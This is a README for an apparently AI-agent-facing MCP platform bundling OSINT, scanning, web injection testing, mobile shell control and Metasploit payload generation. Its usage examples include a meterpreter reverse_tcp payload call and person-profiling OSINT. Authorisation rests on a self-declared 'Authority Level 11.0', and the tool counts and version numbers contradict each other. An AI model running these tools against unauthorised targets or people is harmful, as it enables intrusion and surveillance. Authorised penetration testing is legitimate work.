# 🎯 PROMETHEUS PRIME - COMPLETE OFFENSIVE/DEFENSIVE PLATFORM

**Authority Level:** 11.0
**Version:** 4.0.0 🆕
**Status:** ✅ FULLY OPERATIONAL

---

## 🚀 WHAT IS PROMETHEUS PRIME?

Prometheus Prime is a **complete offensive and defensive security operations platform** featuring:

### CORE CAPABILITIES (43 Tools)
- **OSINT Intelligence** (6 modules) - Phone, Social, Domain, Email, IP
- **Network Security** (5 tools) - Port scanning, Nmap, vulnerability detection
- **Mobile Device Control** (8 tools) - iOS & Android management via ADB/libimobiledevice
- **Web Security Testing** (8 tools) - SQL injection, XSS, crawling, SSL analysis
- **Exploitation Framework** (5 tools) - Metasploit integration, payload generation
- **Phoenix Healing** - Auto-recovery with GS343 patterns

### 🆕 NEW: ADVANCED SECURITY ARSENAL (46 Tools)
- **🔐 Password Cracking** (8 tools) - John, Hashcat, Hydra, Rainbow tables
- **📡 Wireless Security** (11 tools) - WiFi/Bluetooth attacks, WPS cracking, Evil Twin
- **🔍 Digital Forensics** (10 tools) - Disk imaging, Memory analysis, File carving, PCAP analysis
- **💀 Post-Exploitation** (5 tools) - Privilege escalation, Persistence, Credential dumping
- **🛠️ Reverse Engineering** (10 tools) - Ghidra, Radare2, Malware analysis, YARA scanning

**Total: 89 MCP Tools + 13 HTTP API Endpoints**

---

## ⚡ QUICK START

### 1. Install Dependencies
```bash
INSTALL.bat
```

### 2. Configure API Keys
Edit: `P:\ECHO_PRIME\CONFIG\echo_x_complete_api_keychain.env`

### 3. Launch MCP Server
```bash
LAUNCH_PROMETHEUS_MCP.bat
```

### 4. Launch HTTP API (optional)
```bash
LAUNCH_OSINT_API.bat
```

---

## 📊 COMPLETE CAPABILITIES

### 🔍 OSINT INTELLIGENCE

**Phone Intelligence**
- Twilio CNAM caller ID lookup
- Carrier identification
- 30-day smart caching
- Location data

**Social OSINT**
- Reddit profile discovery
- Username enumeration
- Cross-platform correlation
- Google dork generation

**Domain Intelligence**
- WHOIS registration data
- DNS record enumeration
- Domain reputation scoring
- VirusTotal integration

**Email Intelligence**
- HIBP breach detection
- Password compromise checking
- Email validation & deliverability
- Disposable email detection

**IP Intelligence**
- Geolocation (city-level)
- Shodan integration
- Abuse report scoring
- Vulnerability detection

### 🌐 NETWORK SECURITY

**Port Scanner**
- Multi-threaded (50 workers)
- Common port detection
- Service identification
- Fast scanning (1000 ports in ~20s)

**Nmap Integration**
- Basic/Full/Vuln/Aggressive scans
- Service version detection
- OS fingerprinting
- Vulnerability scripts

**Vulnerability Scanner**
- Auto-detection of common vulns
- FTP anonymous access
- MySQL no password
- Weak SSH configurations
- HTTP information disclosure

**Subnet Scanner**
- CIDR notation support
- Live host discovery
- Fast enumeration

**Banner Grabbing**
- Service fingerprinting
- Version detection
- Protocol identification

### 📱 MOBILE DEVICE CONTROL

**Android (ADB)**
- Device enumeration
- Full device information
- Shell command execution
- Screenshot capture
- App installation & management
- File transfer (push/pull)

**iOS (libimobiledevice)**
- Device enumeration
- Full device information
- Screenshot capture
- System log streaming
- App installation

### 🌐 WEB SECURITY TESTING

**Security Headers**
- HSTS, CSP, X-Frame-Options
- Content-Security-Policy
- X-XSS-Protection
- Security score calculation

**SQL Injection Testing**
- 9 different payloads
- Error-based detection
- Multiple injection techniques

**XSS Testing**
- 5 XSS payloads
- Reflected XSS detection
- DOM-based XSS checks

**Directory Bruteforce**
- Wordlist-based enumeration
- Hidden file discovery
- Sensitive path detection

**Web Crawler**
- Link discovery
- Recursive crawling
- Same-domain filtering

**SSL/TLS Scanner**
- Cipher suite analysis
- Certificate validation
- Protocol version detection

**Technology Detection**
- CMS identification
- Framework detection
- JavaScript library discovery

### 💥 EXPLOITATION FRAMEWORK

**Exploit-DB Integration**
- Search 50,000+ exploits
- Code retrieval
- Vulnerability cross-reference

**Payload Generation**
- msfvenom wrapper
- Multi-platform payloads
- Format conversion
- Encoder integration

**Metasploit Integration**
- Module search
- Payload listing
- Framework automation

**Buffer Overflow Tools**
- Cyclic pattern generation
- Offset calculation
- Shellcode generation

---

## 🛠️ INSTALLATION REQUIREMENTS

### Python Modules
```bash
pip install flask flask-cors requests python-dotenv twilio dnspython mcp beautifulsoup4 pymysql --break-system-packages
```

### External Tools (Optional)
- **Nmap** - Network scanning ([Download](https://nmap.org/download.html))
- **ADB** - Android control ([Download](https://developer.android.com/tools/releases/platform-tools))
- **libimobiledevice** - iOS control ([Download](https://libimobiledevice.org/))
- **Metasploit** - Exploitation ([Download](https://www.metasploit.com/))
- **SearchSploit** - Exploit database ([Download](https://www.exploit-db.com/))

### API Keys (9 Services)
Configure in: `P:\ECHO_PRIME\CONFIG\echo_x_complete_api_keychain.env`

- TWILIO_ACCOUNT_SID / TWILIO_AUTH_TOKEN - Phone intelligence
- REDDIT_CLIENT_ID / REDDIT_CLIENT_SECRET - Social OSINT
- WHOISXML_API_KEY - Domain intelligence
- HIBP_API_KEY - Breach detection
- VIRUSTOTAL_API_KEY - Malware scanning
- SHODAN_API_KEY - IP intelligence
- ABUSEIPDB_API_KEY - Abuse reports

---

## 📡 MCP TOOLS (43 Total)

### OSINT (6)
- `prom_health` - System health
- `prom_phone_lookup` - Phone intelligence
- `prom_social_search` - Social OSINT
- `prom_domain_lookup` - Domain intelligence
- `prom_email_analyze` - Email intelligence
- `prom_ip_analyze` - IP intelligence

### Network Security (5)
- `prom_port_scan` - Port scanner
- `prom_nmap_scan` - Nmap wrapper
- `prom_vulnerability_scan` - Vuln detection
- `prom_subnet_scan` - Host discovery
- `prom_service_banner` - Fingerprinting

### Mobile Control (8)
- `prom_android_devices` - List Android devices
- `prom_android_info` - Android info
- `prom_android_shell` - Shell execution
- `prom_android_screenshot` - Screenshot
- `prom_android_apps` - App list
- `prom_ios_devices` - List iOS devices
- `prom_ios_info` - iOS info
- `prom_ios_screenshot` - Screenshot

### Web Security (8)
- `prom_web_headers` - Security headers
- `prom_sql_injection` - SQL testing
- `prom_xss_test` - XSS testing
- `prom_dir_bruteforce` - Directory enum
- `prom_web_crawl` - Web crawler
- `prom_ssl_scan` - SSL analysis
- `prom_tech_detect` - Tech detection
- `prom_web_comprehensive` - Full scan

### Exploitation (5)
- `prom_search_exploits` - Search exploits
- `prom_generate_payload` - Payload gen
- `prom_list_payloads` - List payloads
- `prom_pattern_create` - Pattern gen
- `prom_msf_search` - MSF search

### Utility (2)
- `prom_osint_full` - Complete OSINT
- `prom_healing_stats` - Phoenix stats

---

## 🎯 USAGE EXAMPLES

### OSINT Investigation
```python
# Complete OSINT report
prom_osint_full(
    name="Target Name",
    phone="+15555551234",
    email="target@example.com",
    domain="target.com",
    ip="8.8.8.8",
    location="Texas"
)
```

### Network Reconnaissance
```python
# Port scan
prom_port_scan(target="192.168.1.1")

# Full Nmap scan
prom_nmap_scan(target="192.168.1.1", scan_type="full")

# Subnet discovery
prom_subnet_scan(subnet="192.168.1.0/24")
```

### Web Security Assessment
```python
# Comprehensive scan
prom_web_comprehensive(url="https://target.com")

# Individual tests
prom_sql_injection(url="https://target.com/page", param="id")
prom_xss_test(url="https://target.com/search", param="q")
prom_dir_bruteforce(base_url="https://target.com")
```

### Mobile Device Control
```python
# Android
prom_android_devices()
prom_android_shell(command="pm list packages")
prom_android_screenshot(output_path="screen.png")

# iOS
prom_ios_devices()
prom_ios_screenshot(output_path="screen.png")
```

### Exploitation
```python
# Search exploits
prom_search_exploits(query="windows smb")

# Generate payload
prom_generate_payload(
    payload_type="windows/meterpreter/reverse_tcp",
    lhost="192.168.1.10",
    lport=4444,
    format="exe"
)
```

---

## ⚠️ SECURITY & LEGAL NOTICE

**CRITICAL: AUTHORIZED USE ONLY**

All offensive capabilities require:
- ✅ Written authorization from system owner
- ✅ Defined scope and rules of engagement
- ✅ Compliance with local and international laws
- ✅ Ethical guidelines and responsible disclosure

**Unauthorized access to computer systems is illegal under:**
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- European Cybercrime Convention
- Local and international cybercrime laws

**Commander Bob (Authority Level 11.0)** has full authorization for legitimate penetration testing, security research, and authorized system assessments.

---

## 📁 FILE STRUCTURE

```
PROMETHEUS_PRIME/
├── prometheus_prime_mcp.py         # Complete MCP server (43 tools)
├── osint_api_server.py            # HTTP API (13 endpoints)
├── phone_intelligence.py           # Phone OSINT module
├── social_osint.py                # Social media OSINT module
├── domain_intelligence.py         # Domain intelligence module
├── email_intelligence.py          # Email intelligence module
├── ip_intelligence.py             # IP intelligence module
├── network_security.py            # Network scanning module
├── mobile_control.py              # iOS/Android control module
├── web_security.py                # Web security testing module
├── exploitation_framework.py      # Metasploit integration
├── gs343_gateway.py               # Phoenix healing system
├── requirements.txt               # Python dependencies
├── mls_config.json                # MLS registration
├── INSTALL.bat                    # Installation script
├── LAUNCH_PROMETHEUS_MCP.bat      # MCP launcher
├── LAUNCH_OSINT_API.bat          # HTTP API launcher
├── COMPLETE_STATUS.md             # Full documentation
├── QUICK_REFERENCE.md             # Quick reference
└── README.md                      # This file
```

---

## 🔥 PHOENIX HEALING

All operations feature GS343 Phoenix healing:
- Auto-retry with exponential backoff
- Fallback API chains
- Error categorization & recovery
- Healing suggestions
- Statistics tracking

---

## 📊 PERFORMANCE

**Scan Speeds:**
- Port scan: 1000 ports in ~20 seconds
- Nmap basic: 30-60 seconds
- SQL injection: 9 payloads in ~5 seconds
- XSS testing: 5 payloads in ~3 seconds

**API Response Times:**
- Phone lookup: 200-500ms (cached: <10ms)
- Domain WHOIS: 1-3 seconds
- Email breach check: 500-1500ms
- IP intelligence: 500-2000ms

---

## 🎖️ AUTHORITY LEVEL 11.0

**Commander Bob** - Full authorization for:
- Penetration testing
- Security research
- Vulnerability assessment
- Mobile device forensics
- Web application security testing
- Exploitation framework usage

---

**PROMETHEUS PRIME v3.0.0**  
**Complete Offensive/Defensive Platform**  
**Authority Level: 11.0**  
**Status: FULLY OPERATIONAL** ✅

---

For additional documentation:
- `COMPLETE_STATUS.md` - Full system documentation
- `QUICK_REFERENCE.md` - Fast command reference
- `PHONE_INTEL_README.md` - Phone intelligence guide
- `MCP_SERVER_SETUP_PROMPT.md` - MCP configuration
